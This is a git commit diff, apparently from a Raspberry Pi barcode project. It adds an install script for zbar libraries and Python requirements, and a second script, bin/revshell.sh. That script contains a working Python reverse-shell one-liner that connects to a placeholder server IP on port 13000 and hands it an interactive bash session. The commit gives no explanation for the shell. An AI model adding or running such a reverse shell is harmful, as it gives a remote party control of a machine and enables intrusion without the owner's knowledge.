cb6aa9fcca4dba5e711de0521ce4e42af044737f
Caxapok <caxapok.js@yandex.ru>
2023-10-10 19:14:27 +0300

    startup

---
+++ bin/install.sh
@@ -0,0 +1,3 @@
+#!/usr/bin/env bash
+sudo apt-get install libzbar-dev libzbar0
+pip3 install -r ../src/rpi/requirements.txt
---
+++ bin/revshell.sh
@@ -0,0 +1,2 @@
+#!/usr/bin/env bash
+export RHOST="<SERVER IP>";export RPORT=13000;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
